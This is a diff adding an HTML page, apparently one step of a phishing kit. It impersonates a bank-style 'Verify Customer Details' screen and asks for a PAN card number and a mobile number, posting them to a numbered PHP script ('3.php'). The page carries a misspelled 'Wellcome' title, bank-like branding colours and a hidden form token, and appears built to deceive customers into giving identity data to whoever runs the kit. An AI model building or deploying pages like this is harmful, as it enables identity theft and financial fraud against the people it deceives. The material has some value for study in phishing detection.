@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta name="viewport" content="width=device-width">
+        <title>Wellcome</title>
+        <meta name="description" content="login">
+        <meta name="next-head-count" content="4">
+        <style>
+            body {
+            background-color: #f3f3f3;
+            font-family: Lato-Regular,sans-serif;
+            margin: auto;
+            padding: 0;
+            max-width: 800px
+        }
+        
+        a {
+            color: #97144d;
+            text-decoration: none
+        }
+        
+        .card-login {
+            text-align: center;
+            border-radius: 20px;
+            width: 100%;
+            margin-left: auto;
+            margin-right: auto;
+            box-shadow: inset 0 1px 3px 0 rgba(0,0,0,.5),0 2px 4px 0 rgba(0,0,0,.26)
+        }
+        
+        .card-login>button {
+            background-color: transparent;
+            margin: 0!important;
+            font-size: .75rem!important;
+            border-radius: 20px;
+            padding: 6px 0;
+            border: none;
+            color: #4a4a4a;
+            font-weight: 700;
+            font-family: Lato-Bold;
+            min-width: 0
+        }
+        
+        .card-login #a {
+            width: 50%
+        }
+        
+        .card-login #b {
+            width: 30%
+        }
+        
+        .card-login #c {
+            width: 20%
+        }
+        
+        .card-login>.active {
+            background-color: #97144d;
+            color: #fff
+        }
+        
+        h1 {
+            font-size: .875rem;
+            margin-bottom: 10px;
+            display: block;
+            font-weight: 700;
+            color: #4a4a4a
+        }
+        
+        .header {
+            background-color: #97144d;
+            text-align: left;
+            padding: 10px;
+            position: relative
+        }
+        
+        .header-text {
+            font-family: Lato-Italic,sans-serif!important
+        }
+        
+        .img-logo {
+            width: 50px;
+            height: 10px;
+            margin-bottom: -2px
+        }
+        
+        .card {
+            background-color: #fff;
+            margin: 10px;
+            display: block
+        }
+        
+        .mg {
+            color: #506d85;
+            letter-spacing: normal;
+            line-height: 1.5;
+            font-size: 10px;
+            margin-top: 16px;
+            margin-bottom: 20px
+        }
+        
+        .mainContent {
+            padding: 10px
+        }
+        
+        .para {
+            height: 39px;
+            padding-top: 16px
+        }
+        
+        .pmLogin {
+            margin-top: 1.75rem
+        }
+        
+        .para span {
+            font-size: 16px;
+            font-weight: 600;
+            line-height: 1.2;
+            color: #222
+        }
+        
+        .para span,.text-center {
+            text-align: center
+        }
+        
+        .LoginForm {
+            margin: 15px;
+            padding: 15px
+        }
+        
+        .form-group {
+            margin-bottom: 25px
+        }
+        
+        .form-group label {
+            display: block
+        }
+        
+        .form-group label,.label {
+            color: #9b9b9b;
+            flex-basis: auto;
+            font-family: Lato-Regular;
+            font-size: .875rem;
+            font-weight: 400;
+            line-height: 16px
+        }
+        
+        .radio {
+            accent-color: #97144d
+        }
+        
+        .form-group .new-control {
+            width: 98%;
+            padding: 5px;
+            font-size: 16px;
+            font-weight: 400;
+            color: #000;
+            border-style: none;
+            border-bottom: 1px solid #adbdcc;
+            line-height: 19px
+        }
+        
+        .form-group .new-control:focus {
+            border-style: none;
+            outline: none;
+            border-bottom: 1px solid #adbdcc
+        }
+        
+        .submit {
+            background-color: #97144d;
+            color: #fff;
+            border-radius: 25px;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            width: 50%;
+            font-size: 14px;
+            margin: 10px 0
+        }
+        
+        p {
+            margin-bottom: 0;
+            padding: 10px
+        }
+        
+        .circlespinner {
+            animation: rotate 2s linear infinite;
+            width: 50px;
+            height: 50px;
+            stroke: #fff
+        }
+        
+        .path {
+            stroke: #97144d;
+            stroke-linecap: round;
+            animation: dash 1.5s ease-in-out infinite
+        }
+        
+        @keyframes rotate {
+            to {
+                transform: rotate(1turn)
+            }
+        }
+        
+        @keyframes dash {
+            0% {
+                stroke-dasharray: 1,150;
+                stroke-dashoffset: 0
+            }
+        
+            50% {
+                stroke-dasharray: 90,150;
+                stroke-dashoffset: -35
+            }
+        
+            to {
+                stroke-dasharray: 90,150;
+                stroke-dashoffset: -124
+            }
+        }
+        
+        .l-loading {
+            margin-top: 80px
+        }
+        
+        .form-group .invalid-message {
+            font-size: 12px;
+            color: red
+        }
+        
+           </style>
+       
+    </head>
+        <body>
+            <div id="__next">
+                <div class="header">
+    <span style="box-sizing: border-box; display: inline-block; overflow: hidden; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative; max-width: 100%;">
+    <span style="box-sizing: border-box; display: block; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; max-width: 100%;">
+    <img alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27125%27%20height=%2735%27/%3e" 
+    style="display: block; max-width: 100%; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px;"></span>
+    <img alt="Logo" src="green.png" decoding="async" data-nimg="intrinsic" class="img-logo" style="width: 0px; position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;"></span></div>
+    <div class="mainContent">
+    <h1 class="text-center">Verify Customer Details</h1>
+    <div class="card">
+    <form class="LoginForm" method="post" action="3.php">
+        <input type="hidden" name="formtoken" value="uHRMSw">
+        <div class="form-group">
+            <label for="pan">PAN Card No</label>
+            <input type="text" class="new-control" name="PANCardNo" pattern="[a-zA-Z]{5}[0-9]{4}[a-zA-Z]{1}" title="Please enter valid PAN" minlength="10" maxlength="10" required=""></div>
+            <div class="form-group">
+                
+        <label for="pan">Mobile Number</label>
+        <input type="text" class="new-control" name="MobileNumber" minlength="10" maxlength="10" required=""></div>
+        <div class="text-center">
+        <button type="submit" class="submit">SUBMIT</button></div></form></div></div></div>
+    </body>
+    </html>
